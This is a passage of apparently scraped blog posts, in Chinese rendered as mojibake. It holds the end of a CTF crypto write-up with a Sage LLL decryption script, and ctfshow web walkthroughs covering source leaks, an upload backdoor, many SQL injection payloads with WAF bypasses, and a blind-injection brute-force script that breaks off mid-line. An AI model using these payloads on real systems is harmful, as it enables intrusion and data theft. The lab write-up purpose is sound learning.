å¯¼è‡´è¿™ä¸ªæ–¹ç¨‹çš„è§£ä¼šåç¦»çœŸæ­£çš„$p+q$å¹¶ä¸”ä¸å†æ˜¯æ•´æ•°è§£(è¿™é‡Œæˆ‘è¯•äº†sageè‡ªå¸¦çš„è§£æ–¹ç¨‹, å¯èƒ½æ˜¯æˆ‘å§¿åŠ¿ä¸å¯¹, è§£å‡ºæ¥çš„ç»“æœå†å–æ•´å¹¶ä¸æ˜¯æ­£ç¡®çš„), è§‚å¯Ÿåˆ°å½“$X = K$å’Œ$X=0$çš„æ—¶å€™å·¦è¾¹çš„å¼å­æ˜¯å¼‚å·çš„, è¿™ä¸ªæ—¶å€™å°±å¯ä»¥åˆ©ç”¨é«˜ä¸­çš„çŸ¥è¯†! æ ¹å­˜åœ¨æ€§å®šç†, å¹¶ç”¨äºŒåˆ†æ³•å»é€¼è¿‘ä¸€ä¸ªé è¿‘è§£çš„æ•´æ•°$X_0$. è€Œè¿™ä¸ª$X_0 \\approx p+q $, åˆ©ç”¨è¿™ä¸ª$X_0$å°±å¯ä»¥å¤§æ¦‚ç‡çš„è§£å‡º$p,q$äº† å› ä¸º$X_0$åªæ˜¯ä¸ªè¿‘ä¼¼, è€Œä¸”æ±‚å‡ºæ¥è¿˜å¯èƒ½æ˜¯å¥‡æ•°, æ‰€ä»¥éœ€è¦å‰åè°ƒä¸€ä¸‹, æ¯”å¦‚+1 -1 +2 -2 ç­‰ç­‰å…³äºä¸ºå•¥ä¸èƒ½æ˜¯å¥‡æ•°, $p+q$æ€ä¹ˆä¼šæ˜¯å¥‡æ•°å‘¢hhh è‡³æ­¤, æˆ‘ä»¬æˆåŠŸçš„ç®—å‡ºäº†$p,q$, æ‰€æœ‰çš„å‚æ•°åŒ…æ‹¬ç§é’¥ä¹Ÿéƒ½å¯ä»¥æ±‚å‡ºæ¥äº†, å†åˆ©ç”¨é¢˜ç›®è‡ªå¸¦çš„è§£å¯†ç®—æ³•è§£å¯†å°±è¡Œäº†. exp1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586# sagemathfrom gmpy2 import *from Crypto.Util.number import long_to_bytes as l2bdef find_p_puls_q(f,k): s = 0 b = k for i in range(2000): a = (s+b) // 2 if f.subs(x==a) &gt; 0: s = a else: b = a return adef find_p(pq,n): p = var('p') if pq^2 - 4*n&lt;0: return [] f = p^2 - pq*p+n r = f.roots() res = [] for i in r: if i[0]&gt;0: res.append(int(i[0])) return (res[0],res[1])def decrypt(c, d, n): n = int(n) size = n.bit_length() // 2 c_high, c_low = c b = (c_low**2 - c_high**3) % n EC = EllipticCurve(Zmod(n), [0, b]) m_high, m_low = (EC((c_high, c_low)) * d).xy() m_high, m_low = int(m_high), int(m_low) return (m_high &lt;&lt; size) | m_lowmasked_flag = 10629883656219490982178951599484437698263214790268091560719514148215968944141123323489358824379735126966804354267426040231682908197526817342035901781691470ciphertexts = [...]PK = []N = [ciphertexts[0]['n'],ciphertexts[1]['n'],ciphertexts[2]['n']]E = [ciphertexts[0]['e'],ciphertexts[1]['e'],ciphertexts[2]['e']]C = [ciphertexts[0]['c'],ciphertexts[1]['c'],ciphertexts[2]['c']]M=iroot(int(N[0]),2)[0]a=[0]*4a[0]=[M,E[0],E[1],E[2]]a[1]=[0,-N[0],0,0]a[2]=[0,0,-N[1],0]a[3]=[0,0,0,-N[2]]Mat = matrix(ZZ,a)Mat_LLL=Mat.LLL()x = int(abs(Mat_LLL[0][0])//M)assert x * M == abs(Mat_LLL[0][0])S=[Mat_LLL[0][1],Mat_LLL[0][2],Mat_LLL[0][3]]A=[round(N[0]^0.25)^2,round(N[1]^0.25)^2,round(N[2]^0.25)^2]assert (E[0] * x - S[0]) % N[0] == 0assert (E[1] * x - S[1]) % N[1] == 0assert (E[2] * x - S[2]) % N[2] == 0Y = [0,0,0]for i in range(3): Y[i] = (E[i]*x - S[i]) // N[i]KK = [0,0,0]for i in range(3): KK[i] = (E[i] * x -Y[i] * N[i] ) // Y[i]x = var('x')FF = [0,0,0]for i in range(3): FF[i] = (3*(KK[i]-1)*x-3*x^2)^2 - A[i]*(x^2-4*N[i])ppq1 = find_p_puls_q(FF[0],KK[0])ppq2 = find_p_puls_q(FF[1],KK[1])ppq3 = find_p_puls_q(FF[2],KK[2])p1,q1 = find_p(ppq1+1,N[0])p2,q2 = find_p(ppq2+1,N[1])p3,q3 = find_p(ppq3+1,N[2])d1,d2,d3 = inverse_mod(E[0],(p1+1)*(q1+1)),inverse_mod(E[1],(p2+1)*(q2+1)),inverse_mod(E[2],(p3+1)*(q3+1))l2b(decrypt(C[0],d1,N[0])^^decrypt(C[1],d2,N[1])^^decrypt(C[2],d3,N[2])^^masked_flag)","link":"/2021/04/06/writeup-for-2021%E8%99%8E%E7%AC%A6/"},{"title":"","text":"é‡é‡‘ä¹°äº†ä¸ªå·æ€ä¹ˆå¯èƒ½ä¸åšå‘¢???å¥½å¥½å­¦å­¦Webäº† çœŸçš„å¾ˆé‡è¦! ä¿¡æ¯æœé›† Web1~20Web 1F12 Web 2æ²¡åŠæ³•F12å’Œå³é”®äº†, ç›´æ¥firefoxå¼€å‘è€…å·¥å…· Web 3æŠ“åŒ…, flagå°±åœ¨å“åº”é‡Œ æ‰€ä»¥æœ‰æ—¶å€™æ²¡æ€è·¯å°±æŠ“æŠ“åŒ…, æœ‰å¯èƒ½æœ‰çº¿ç´¢æˆ–è€…æç¤ºçš„ Web 4robots.txt æ‰€ä»¥æ²¡æ€è·¯çš„æ—¶å€™å°±é˜¿å·´é˜¿å·´ Web 5phpsæºç æ³„éœ² æœ‰æ—¶å€™è¯•è¯•phpsè¯»æºç , æœ‰æƒŠå–œå“¦ Web 6ä¹Ÿæ˜¯æºç æ³„éœ², åº”è¯¥æ˜¯å¤‡ä»½å‹ç¼©åŒ…å¸¸è§çš„åå­—æœ‰ 1234567'www.zip','www.bak','www.rar','www.7z','www.tar','www.tar.gz','www.txt' Web 7gitæ³„éœ²æ¼æ´æˆå› ï¼šåœ¨è¿è¡Œgit initåˆå§‹åŒ–ä»£ç åº“çš„æ—¶å€™ï¼Œä¼šåœ¨å½“å‰ç›®å½•ä¸‹é¢äº§ç”Ÿä¸€ä¸ª.gitçš„éšè—æ–‡ä»¶ï¼Œç”¨æ¥è®°å½•ä»£ç çš„å˜æ›´è®°å½•ç­‰ç­‰ã€‚åœ¨å‘å¸ƒä»£ç çš„æ—¶å€™ï¼ŒæŠŠ.gitè¿™ä¸ªç›®å½•æ²¡æœ‰åˆ é™¤ï¼Œç›´æ¥å‘å¸ƒäº†ã€‚ä½¿ç”¨è¿™ä¸ªæ–‡ä»¶ï¼Œå¯ä»¥ç”¨æ¥æ¢å¤æºä»£ç ã€‚ ä¸€èˆ¬æ¥è¯´å°±æ˜¯.gitæ³„éœ²ä¹‹åæ¢å¤æºç ä»€ä¹ˆçš„. æœ‰æ—¶å€™è¿˜ä¼šéœ€è¦ç”¨.git/config ä¸­å«æœ‰çš„access_tokenä¿¡æ¯, ä»è€Œè®¿é—®è¿™ä¸ªç”¨æˆ·çš„å…¶ä»–ä»“åº“ æœ‰äº›æ—¶å€™è®¿é—®.gitä¼šè¿”å›403, è¿™ä¸ªæ—¶å€™å°±è¦è¯•æ¢çš„è®¿é—®.git/config, å¦‚æœæœ‰å†…å®¹è¿”å›, å°±è¯´æ˜å­˜åœ¨gitæ³„éœ². å…³äºæ•æ„Ÿç›®å½•æ³„éœ², è¿˜æœ‰SVNæ³„éœ², HGæ³„éœ²ç­‰ç­‰â€¦ ç­‰ä»¥åé‡åˆ°äº†å†æ¥æ€»ç»“ Web 8SVN æ³„éœ²SVN(subversion)æ˜¯ä¸€ä¸ªæºä»£ç ç‰ˆæœ¬ç®¡ç†è½¯ä»¶. åŒæ ·çš„éšè—æ–‡ä»¶.SVNé‡Œé¢ä¼šæœ‰ä¿¡æ¯. åˆ©ç”¨seay-svnè·å–æœåŠ¡å™¨æºç ç­‰ä¿¡æ¯ Web 9vimå¤‡ä»½æ–‡ä»¶æ³„éœ²å½“ç”¨æˆ·åœ¨ç”¨vimç¼–è¾‘æ–‡ä»¶ä½†æ„å¤–é€€å‡ºæ—¶, ä¼šåœ¨å½“å‰ç›®å½•ä¸‹ç”Ÿæˆä¸€ä¸ªå¤‡ä»½æ–‡ä»¶, æ–‡ä»¶åæ ¼å¼ä¸º.æ–‡ä»¶å.swp é’ˆå¯¹swpå¤‡ä»½æ–‡ä»¶, å¯ä»¥ç”¨vim -rå‘½ä»¤æ¢å¤æ–‡ä»¶çš„å†…å®¹. Web 10Cookiesé‡Œé¢æœ‰å†…å®¹ æŠ“åŒ…åˆ†æçš„æ—¶å€™ä¸€èˆ¬éƒ½ä¼šçœ‹çœ‹Cookiesçš„ Web 11åŸŸåè§£æhttp://dbcha.com/ é‡Œé¢æŸ¥ctfshow.comçš„txtè®°å½• é¡ºä¾¿å­¦ä¹ ä¸€ä¸‹åŸŸåè§£æçš„ç±»å‹ åŸŸåè§£æç±»å‹: A/CNAME/MX/NS/TXT/AAAA/SRV/æ˜¾æ€§URL/éšæ€§URLAè®°å½•ï¼šå°†åŸŸåæŒ‡å‘ä¸€ä¸ªIPv4åœ°å€ï¼ˆä¾‹å¦‚ï¼š10.10.10.10ï¼‰ï¼Œéœ€è¦å¢åŠ Aè®°å½•CNAMEè®°å½•ï¼šå¦‚æœå°†åŸŸåæŒ‡å‘ä¸€ä¸ªåŸŸåï¼Œå®ç°ä¸è¢«æŒ‡å‘åŸŸåç›¸åŒçš„è®¿é—®æ•ˆæœï¼Œéœ€è¦å¢åŠ CNAMEè®°å½•MXè®°å½•ï¼šå»ºç«‹ç”µå­é‚®ç®±æœåŠ¡ï¼Œå°†æŒ‡å‘é‚®ä»¶æœåŠ¡å™¨åœ°å€ï¼Œéœ€è¦è®¾ç½®MXè®°å½•NSè®°å½•ï¼šåŸŸåè§£ææœåŠ¡å™¨è®°å½•ï¼Œå¦‚æœè¦å°†å­åŸŸåæŒ‡å®šæŸä¸ªåŸŸåæœåŠ¡å™¨æ¥è§£æï¼Œéœ€è¦è®¾ç½®NSè®°å½•TXTè®°å½•ï¼šå¯ä»»æ„å¡«å†™ï¼ˆå¯ä¸ºç©ºï¼‰ï¼Œé€šå¸¸ç”¨åšSPFè®°å½•ï¼ˆååƒåœ¾é‚®ä»¶ï¼‰ä½¿ç”¨AAAAè®°å½•ï¼šå°†ä¸»æœºåï¼ˆæˆ–åŸŸåï¼‰æŒ‡å‘ä¸€ä¸ªIPv6åœ°å€ï¼ˆä¾‹å¦‚ï¼šff03:0:0:0:0:0:0:c1ï¼‰ï¼Œéœ€è¦æ·»åŠ AAAAè®°å½•SRVè®°å½•ï¼šè®°å½•äº†å“ªå°è®¡ç®—æœºæä¾›äº†å“ªä¸ªæœåŠ¡ã€‚æ ¼å¼ä¸ºï¼šæœåŠ¡çš„åå­—.åè®®çš„ç±»å‹ï¼ˆä¾‹å¦‚ï¼š_example-server._tcpï¼‰æ˜¾æ€§URLï¼šå°†åŸŸåæŒ‡å‘ä¸€ä¸ªhttp(s)åè®®åœ°å€ï¼Œè®¿é—®åŸŸåæ—¶ï¼Œè‡ªåŠ¨è·³è½¬è‡³ç›®æ ‡åœ°å€ï¼ˆä¾‹å¦‚ï¼šå°†www.net.cnæ˜¾æ€§è½¬å‘åˆ°www.hichina.comåï¼Œè®¿é—®www.net.cnæ—¶ï¼Œåœ°å€æ æ˜¾ç¤ºçš„åœ°å€ä¸ºï¼šwww.hichina.comï¼‰ã€‚éšæ€§URLï¼šä¸æ˜¾æ€§URLç±»ä¼¼ï¼Œä½†éšæ€§è½¬å‘ä¼šéšè—çœŸå®çš„ç›®æ ‡åœ°å€ï¼ˆä¾‹å¦‚ï¼šå°†www.net.cnéšæ€§è½¬å‘åˆ°www.hichina.comåï¼Œè®¿é—®www.net.cnæ—¶ï¼Œåœ°å€æ æ˜¾ç¤ºçš„åœ°å€ä»ç„¶ä¸ºï¼šwww.net.cnï¼‰ã€‚ Web 12 å¼€å§‹å˜å¾—å¥‡æ€ªäº† è¿›å»æ˜¯ä¸€ä¸ªè´­ç‰©ç½‘ç«™, æŠ“åŒ…æ— æœ, çœ‹äº†ä¸‹robots.txt, æœ‰æç¤º/admin/è¦è¾“å…¥è´¦å·å¯†ç , è´¦å·å°±æ˜¯admin, å¯†ç æ˜¯ç½‘ç«™ä¸‹é¢çš„é‚£ä¸²æ•°å­— æ­£å¸¸æƒ…å†µä¸‹æ²¡æœ‰äººä¼šè¿™ä¹ˆå¹²å§!æ‰€ä»¥è¿˜æ˜¯è¦å¤šå»çœ‹çœ‹ä¸€ä¸‹å¯ä»¥æœé›†ä¿¡æ¯çš„åœ°æ–¹, robotx.txtå•¥çš„ Web 13æ‹¿åˆ°ä¸€ä¸ªç½‘ç«™å¯ä»¥çœ‹çœ‹çœ‹çœ‹æœ‰å“ªäº›é“¾æ¥æ˜¯å¯ä»¥è·³è½¬çš„(å“ªäº›æ˜¯å¯ä»¥ç‚¹å‡»çš„)ç½‘ç«™ä¸‹é¢æœ‰ä¸ªdocumentå¯ä»¥ç‚¹, è¿›å»ä»¥åé‡Œé¢æœ‰åå°çš„åœ°å€å’Œç”¨æˆ·åå¯†ç . Web 14 KindEditor PHPç¼–è¾‘å™¨æœ€æ–°ç‰ˆé»˜è®¤é…ç½®ä¸‹ï¼Œå¦‚æœç›®å½•ä¸å­˜åœ¨ï¼Œåˆ™ä¼šéå†æœåŠ¡å™¨æ ¹ç›®å½• è¿›å…¥/editor/(è¿™ä¸ªå¾—ç›®å½•æ‰«æå§â€¦ åˆ©ç”¨ä¸Šä¼ å›¾ç‰‡éå†æœåŠ¡å™¨æ ¹ç›®å½•, åœ¨ç½‘ç«™ç›®å½•ä¸‹æ‰¾åˆ°/nothinghere/fl000g.txt Web 15ç›®å½•ä¸‹æœ‰admin/å¿˜è®°å¯†ç éœ€è¦å¡«å†™å¯†ä¿è€Œç½‘ç«™ä¸‹æ–¹æœ‰qqé‚®ç®±, æœç´¢qqå¯ä»¥çŸ¥é“å¯†ä¿ç­”æ¡ˆ Web 16è€ƒå¯ŸPHPæ¢é’ˆphpæ¢é’ˆæ˜¯ç”¨æ¥æ¢æµ‹ç©ºé—´ã€æœåŠ¡å™¨è¿è¡ŒçŠ¶å†µå’ŒPHPä¿¡æ¯ç”¨çš„ï¼Œæ¢é’ˆå¯ä»¥å®æ—¶æŸ¥çœ‹æœåŠ¡å™¨ç¡¬ç›˜èµ„æºã€å†…å­˜å ç”¨ã€ç½‘å¡ æµé‡ã€ç³»ç»Ÿè´Ÿè½½ã€æœåŠ¡å™¨æ—¶é—´ç­‰ä¿¡æ¯ã€‚ urlåç¼€åæ·»åŠ /tz.php ç‰ˆæœ¬æ˜¯é›…é»‘PHPæ¢é’ˆ. Web 17åˆ©ç”¨ping ç›´æ¥è·å¾—æŸä¸ªåŸŸåæ‰€å¯¹åº”çš„ip Web 18jsä»£ç å®¡è®¡, æ‰¾åˆ°æ¸¸æˆç»“æœçš„åˆ¤æ–­å°±èƒ½æ‰¾åˆ°çº¿ç´¢ Web 19AESåŠ å¯†, ä½†æ˜¯Key iv mode padmodeéƒ½åœ¨å‰ç«¯â€¦.åˆ©ç”¨http://tool.chacuo.net/cryptaesè§£å¯†å³å¯ æ–‡ä»¶ä¸Šä¼  web151 ~ web170å‰ç«¯éªŒè¯ä¸Šä¼ æ–‡ä»¶åç¼€å, åªéœ€è¦æŠ“åŒ…æ”¹ä¸€ä¸‹æ–‡ä»¶åç§°å°±èƒ½ä¸Šä¼ åé—¨äº† é€šè¿‡lsæ‰¾åˆ°flag.php , cat flag.phpå³å¯ sqlæ³¨å…¥ web171~ web253web 171è¯­å¥: 1$sql = &quot;select username,password from user where username !='flag' and id = '&quot;.$_GET['id'].&quot;' limit 1;&quot;; ç›´æ¥åœ¨æœ¬è¡¨å†…çˆ†å‡ºæ‰€æœ‰æ•°æ®å³å¯, payload: id= 1' or 1 --+ web 172è¯­å¥$sql = &quot;select username,password from ctfshow_user2 where username !='flag' and id = '&quot;.$_GET['id'].&quot;' limit 1;&quot;; ä½†æ˜¯è¾“å‡ºç»è¿‡äº†è¿‡æ»¤: 1234//æ£€æŸ¥ç»“æœæ˜¯å¦æœ‰flag if($row-&gt;username!=='flag'){ $ret['msg']='æŸ¥è¯¢æˆåŠŸ'; } æ‰€ä»¥éœ€è¦æŠŠè¿”å›å‡ºæ¥çš„usernameæ”¹æ‰, è®©ä»–æ£€æŸ¥ä¸å‡ºæ¥, payload: 1' union select 1,password from ctfshow_user2 where username = 'flag' --+ web 173è¯­å¥:$sql = &quot;select id,username,password from ctfshow_user3 where username !='flag' and id = '&quot;.$_GET['id'].&quot;' limit 1;&quot;; è¿”å›é€»è¾‘ 12345//æ£€æŸ¥ç»“æœæ˜¯å¦æœ‰flag if(!preg_match('/flag/i', json_encode($ret))){ $ret['msg']='æŸ¥è¯¢æˆåŠŸ'; } è¿™é‡Œç›´æ¥å¯¹ç»“æœè¿›è¡Œè¿‡æ»¤, éœ€è¦è®©è¿”å›çš„ç»“æœä¸å­˜åœ¨flag, è€ƒè™‘å°†è¿”å›çš„ç»“æœå…¨éƒ¨è½¬æˆåå…­è¿›åˆ¶ payload: 0' union select 1,hex(username),hex(password) from ctfshow_user3 where username = 'flag' --+ ç„¶åå°†è¿”å›çš„ç»“æœè½¬æˆtextå³å¯, ä½†æ˜¯å‡ºæ¥flagçš„æ—¶å€™å‘ç°, å…¶å®æ ¹æœ¬ä¸éœ€è¦è½¬æˆ16è¿›åˆ¶, å› ä¸ºflagé‡Œæ ¹æœ¬å°±æ²¡æœ‰flagå­—æ ·(ctfshow{3354c0bf-e7ab-4e26-9990-b5679766170d}), æ‰€ä»¥ç›´æ¥0' union select 1,2,password from ctfshow_user3 where username = 'flag' --+ ä¹Ÿèƒ½å‡ºç»“æœ web 174è¯­å¥: $sql = &quot;select username,password from ctfshow_user4 where username !='flag' and id = '&quot;.$_GET['id'].&quot;' limit 1;&quot;; è¿”å›é€»è¾‘ 12345//æ£€æŸ¥ç»“æœæ˜¯å¦æœ‰flag if(!preg_match('/flag|[0-9]/i', json_encode($ret))){ $ret['msg']='æŸ¥è¯¢æˆåŠŸ'; } è¿™ä¸‹å¥½äº†, ç»“æœé‡Œè¿æ•°å­—éƒ½ä¸èƒ½å‡ºç°äº†, hex(), base64()ä¼°è®¡éƒ½ä¸èƒ½ç”¨äº†, æƒ³ä¸ªåŠæ³•æŠŠæ•°å­—è½¬æˆåˆ«çš„å­—ç¬¦, replace(str1,str2,str3) å¯ä»¥æŠŠstr1ä¸­çš„str2æ›¿æ¢æˆstr3, å¯ä»¥è€ƒè™‘ç”¨è¿™ä¸ªå°†æ‰€æœ‰æ•°å­—æ¢æˆå¤§å†™å­—æ¯(æ¯•ç«Ÿflagä¸­æ˜¯æ²¡æœ‰å¤§å†™å­—æ¯çš„, æ²¡æœ‰æ‰¾åˆ°sqlç”¨æ­£åˆ™çš„æ–¹æ³•, åªèƒ½æŠŠå¤šä¸ªreplace()å¥—åœ¨ä¸€èµ·äº† payload:0' union select 'a',replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(password,'1','A'),'2','B'),'3','C'),'4','D'),'5','E'),'6','F'),'7','G'),'8','H'),'9','I'),'0','J') from ctfshow_user4 where username = 'flag' --+ ç„¶åå°†è¿”å›çš„ç»“æœä¸­çš„å¤§å†™å­—æ¯è½¬å›æ•°å­—å°±è¡Œäº† web 175è¯­å¥:$sql = &quot;select username,password from ctfshow_user5 where username !='flag' and id = '&quot;.$_GET['id'].&quot;' limit 1;&quot;; è¿”å›é€»è¾‘ 12345//æ£€æŸ¥ç»“æœæ˜¯å¦æœ‰flag if(!preg_match('/[\\x00-\\x7f]/i', json_encode($ret))){ $ret['msg']='æŸ¥è¯¢æˆåŠŸ'; } å·²ç»ä¸èƒ½è¿”å›ä»»ä½•ä¸œè¥¿äº†, \\x00~\\x7få…¨éƒ¨è¿‡æ»¤æ‰äº†, è€ƒè™‘æ–‡ä»¶çš„æ–¹å¼è¯»å–flag. ç”¨INTO OUTFILE å¯ä»¥å°†æŸ¥è¯¢ç»“æœè¾“å‡ºåˆ°æŸæ–‡ä»¶ä¸­, åœ¨è¿™é‡Œåªéœ€è¦è¾“å‡ºåˆ°ä¸€ä¸ªæ–‡ä»¶é‡Œå°±è¡Œäº†, ä¸è¿‡è·¯å¾„è¦è®°å¾—å†™å¯¹var\\www\\html\\ payload: 1' union select username,password from ctfshow_user5 where username='flag' into outfile '/var/www/html/res.txt'--+ ç»“æœå°±åœ¨res.txté‡Œ web 176å¼€å§‹æœ‰è¿‡æ»¤äº† è¯­å¥:$sql = &quot;select id,username,password from ctfshow_user where username !='flag' and id = '&quot;.$_GET['id'].&quot;' limit 1;&quot;; è¿”å›é€»è¾‘ 1234//å¯¹ä¼ å…¥çš„å‚æ•°è¿›è¡Œäº†è¿‡æ»¤ function waf($str){ //ä»£ç è¿‡äºç®€å•ï¼Œä¸å®œå±•ç¤º } åªçŸ¥é“æœ‰è¿‡æ»¤, ä½†ä¸çŸ¥é“è¿‡æ»¤äº†å•¥, ä¹Ÿæ²¡å¤šæƒ³å…ˆè¯•è¯•1' or 1 --+å°±å‡ºflagäº†, çœ‹ç¾¤ä¸»çš„è§†é¢‘è¿™é¢˜åº”è¯¥æ˜¯å¤§å°å†™ç»•è¿‡ web 177è¯­å¥$sql = &quot;select id,username,password from ctfshow_user where username !='flag' and id = '&quot;.$_GET['id'].&quot;' limit 1;&quot;; è¿”å›é€»è¾‘ 1234//å¯¹ä¼ å…¥çš„å‚æ•°è¿›è¡Œäº†è¿‡æ»¤ function waf($str){ //ä»£ç è¿‡äºç®€å•ï¼Œä¸å®œå±•ç¤º } ä¸€æ ·æ˜¯è¿‡æ»¤, ç»§ç»­å°è¯•1' or 1 --+, å‘ç°æ— ç»“æœ, åº”è¯¥æ˜¯æŸäº›å­—ç¬¦è¢«è¿‡æ»¤äº†. è¿™ä¸ªæ—¶å€™å› ä¸ºä¸çŸ¥é“ä»€ä¹ˆè¢«è¿‡æ»¤, æ‰€ä»¥è¾“å…¥è¶Šå°‘ä¸œè¥¿è¶Šèƒ½åˆ¤æ–­å‡ºè¿‡æ»¤äº†ä»€ä¹ˆ. å…ˆå°è¯•1'--+ å‘ç°æ— ç»“æœ, å¯èƒ½--+è¢«è¿‡æ»¤äº†, å°è¯•ç”¨# ä¹Ÿä¸è¡Œ, å†è¯•è¯•%23, å‘ç°å¯ä»¥ç»•è¿‡è¿‡æ»¤ å†å°è¯•1' %23åˆæ˜¯æ— ç»“æœ,æ˜æ˜¾æ˜¯ç©ºæ ¼è¢«è¿‡æ»¤äº†, åˆ©ç”¨/**/æ³¨é‡Šç»•è¿‡ç©ºæ ¼. äºæ˜¯å¾—åˆ°ä¸€ä¸ªpayload: 1'/**/or/**/1%23 web 178 179ä¾æ—§æ˜¯è¿‡æ»¤æ‰äº†ç©ºæ ¼, ä½†æ˜¯/**/ä¸èƒ½ä½¿ç”¨äº†, åˆ™å°è¯•ç”¨æ‹¬å·æ¥ç»•è¿‡ payload:1'or(1)%23 ç®€å•ç²—æš´ çœ‹äº†ç¾¤ä¸»çš„è§†é¢‘å‘ç°è¿˜å¯ä»¥ç”¨%09æ¥ä»£æ›¿ç©ºæ ¼, è¿™ä¸ªæ˜¯åˆ¶è¡¨ç¬¦, åœ¨sqlä¸­è·Ÿç©ºæ ¼ä¸€æ ·çš„ä½œç”¨ payload:1'%09or%091%23 ç„¶ååœ¨web 179é‡Œ, %09ä¹Ÿè¢«è¿‡æ»¤äº†, ç¬¬ä¸€ä¸ªpayloadè¿˜æ˜¯å¯ä»¥ç”¨çš„, ä½†è¿˜å¯ä»¥è¯•è¯•åˆ«çš„, æ¯”å¦‚%0a %0b %0cç­‰ç­‰, æŠŠasciiç å‰é¢é‚£å‡ ä¸ªå­—ç¬¦éƒ½è¯•ä¸€è¯•, è¯•å‡º%0cä¹Ÿæ˜¯å¯ä»¥çš„ payload:1'%0cor%0c1%23 web 180è¯­å¥$sql = &quot;select id,username,password from ctfshow_user where username !='flag' and id = '&quot;.$_GET['id'].&quot;' limit 1;&quot;; è·Ÿå‰é¢çš„ä¸åŒçš„æ˜¯, è¿™æ¬¡è¿%23éƒ½è¢«è¿‡æ»¤äº†, å¯ä»¥è¯´æ²¡åŠæ³•æ³¨é‡Šæ‰åé¢çš„sqlè¯­å¥äº†, åªèƒ½é€šè¿‡é—­åˆçš„æ–¹å¼ä½¿å¾—è¯­å¥ä¸ä¼šå‡ºé”™ ä¾‹å¦‚1'and'a'='a, è¿™æ ·è¯­å¥å°±ä¼šå˜æˆ 1select id,username,password from ctfshow_user where username !='flag' and id = '1'and'a'='a' limit 1 å¯ä»¥çœ‹åˆ°å¼•å·è¢«æˆåŠŸçš„é—­åˆ, ç»“æœä¹Ÿæ˜¯æœ‰çš„. ä½†æ˜¯, æƒ³è¦æŸ¥å‡ºflagè¿˜éœ€è¦æƒ³åŠæ³•ä½¿å¾—username != 'flag'æ— æ•ˆ, å› username != 'flag'ä¸åé¢çš„æ¡ä»¶å…³ç³»æ˜¯and, æ‰€ä»¥å¹¶ä¸èƒ½é€šè¿‡ä»–åŸæœ¬çš„è¯­å¥ä¸­çš„id=æŸ¥id = 26æ‰¾åˆ°flag(id=26æ˜¯flagæ˜¯å› ä¸ºå‰é¢çš„é¢˜ç›®éƒ½æ˜¯26), æ‰€ä»¥éœ€è¦æ„é€ ä¸€ä¸ªæ–°çš„ä¸å‰é¢çš„æ¡ä»¶çš„å…³ç³»ä¸ºorçš„æ¡ä»¶æ¥æŸ¥æ‰¾ æ‰€ä»¥è€ƒè™‘äº†1'or(1)and'a, ä½†æ˜¯å¾—åˆ°çš„ç»“æœå´åªæœ‰ä¸€è¡Œ, åŸå› æ˜¯å› ä¸ºè¯­å¥ä¸­æœ‰ä¸ªlimit 1. è€ŒåŸæœ¬è¯­å¥ä¸­çš„id=1æ˜¯å¯ä»¥æŸ¥è¯¢å‡ºç»“æœçš„, è¿™é‡Œä¸èƒ½è®©ä»–æŸ¥è¯¢å‡ºç»“æœäº†, è€Œå‡ºæ¥çš„ç»“æœåˆå¿…é¡»æ˜¯flagé‚£ä¸€æ¡, æ‰€ä»¥è€ƒè™‘å°†oræ‹¬å·ä¸­çš„æ¡ä»¶æ”¹æˆid=26. è¿™æ ·å°±æˆåŠŸæ„é€ å‡ºpayload:0'or(id=26)and'a'='a web 181è¯­å¥$sql = &quot;select id,username,password from ctfshow_user where username !='flag' and id = '&quot;.$_GET['id'].&quot;' limit 1;&quot;; è¿”å›é€»è¾‘ 1234//å¯¹ä¼ å…¥çš„å‚æ•°è¿›è¡Œäº†è¿‡æ»¤ function waf($str){ return preg_match('/ |\\*|\\x09|\\x0a|\\x0b|\\x0c|\\x00|\\x0d|\\xa0|\\x23|\\#|file|into|select/i', $str); } web 180çš„payloadä¸­çš„å­—ç¬¦ä¸²è¿™é¢˜éƒ½æ²¡æœ‰è¿‡æ»¤æ‰, ç›´æ¥0'or(id=26)and'a'='aå‡ºç»“æœ web 182å’Œweb 181ä¸€æ ·, ç›´æ¥0'or(id=26)and'a'='a web 183æŸ¥è¯¢è¯­å¥ 123//æ‹¼æ¥sqlè¯­å¥æŸ¥æ‰¾æŒ‡å®šIDç”¨æˆ· $sql = &quot;select count(pass) from &quot;.$_POST['tableName'].&quot;;&quot;; è¿”å›é€»è¾‘ 1234//å¯¹ä¼ å…¥çš„å‚æ•°è¿›è¡Œäº†è¿‡æ»¤ function waf($str){ return preg_match('/ |\\*|\\x09|\\x0a|\\x0b|\\x0c|\\x0d|\\xa0|\\x00|\\#|\\x23|file|\\=|or|\\x7c|select|and|flag|into/i', $str); } æŸ¥è¯¢ç»“æœ 12//è¿”å›ç”¨æˆ·è¡¨çš„è®°å½•æ€»æ•° $user_count = 1; ç»“æœåªä¼šè¿”å›ç»“æœçš„æ•°é‡, è€Œä¸”è¿‡æ»¤æ‰äº†å¾ˆå¤šå…³é”®å­—. çœ‹äº†ä¸‹è§†é¢‘, è¿™é‡Œè¦ç”¨åˆ°æ­£åˆ™+ç›²æ³¨, sqlä¸­çš„æ­£åˆ™æ˜¯ç”¨REGEXPâ€™strâ€™æ¥åŒ¹é…çš„, ä¾‹å¦‚select id from table where username REGXEP'admin' å°±ä¼šæŸ¥è¯¢ç¬¦åˆæ­£åˆ™å¼å­çš„usernameå­—æ®µçš„é‚£ä¸€è¡Œ è¿™é‡Œå› ä¸ºå¯ä»¥çŸ¥é“ç»“æœæœ‰å‡ è¡Œ, ä¹Ÿå°±æ„å‘³ç€å¯ä»¥åˆ¤æ–­æ­£åˆ™æ˜¯å¦åŒ¹é…, ç”±å‰é¢çš„é¢˜ç›®å¯ä»¥çŸ¥é“flagçš„æ ¼å¼æ˜¯ctfshow{xxxx-xxx-x-x-x}è¿™ç§, è€Œä¸”åªæœ‰å°å†™å­—æ¯å’Œæ•°å­—, æ‰€ä»¥è€ƒè™‘ç”¨è„šæœ¬ç›²æ³¨, ä»`ctfshow_user`where`pass`REGEXP'ctfshow{å¼€å§‹çŒœflag 1234567891011121314151617181920import requestsimport reurl = 'http://aba2e256-aa5c-4cf3-849f-b4f6d61fb78d.chall.ctf.show:8080/select-waf.php'Str = '0123456789abcdefghijklmnopqrstuvwxyz-}'data = { 'tableName': &quot;`ctfshow_user`where`pass`REGEXP'ctfshow{&quot;}while True: for i in Str: Data = { 'tableName': data['tableName'] + i + &quot;'&quot; } resp = requests.post(url=url, data=Data) if re.findall('\\$user_count = (\\d)',resp.content.decode())[0] == '1': data['tableName'] += i print(re.findall('\\$user_count = 